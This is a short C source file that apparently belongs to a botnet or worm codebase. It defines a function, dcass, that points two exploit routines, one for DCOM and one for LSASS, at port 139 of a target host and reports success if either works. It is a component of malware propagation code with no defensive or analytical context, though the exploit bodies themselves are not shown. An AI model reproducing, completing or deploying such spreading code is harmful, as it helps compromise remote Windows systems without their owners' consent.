#include "..\Inc.h"
#include "..\Fun.h"
#include "..\Ext.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_DCASS
BOOL dcass(EXINFO exinfo)
{
	exinfo.port = 139;
	BOOL bDCOM = dcom(exinfo);
	exinfo.port = 139;
	BOOL bLSASS = lsass(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}
#endif
#endif
#endif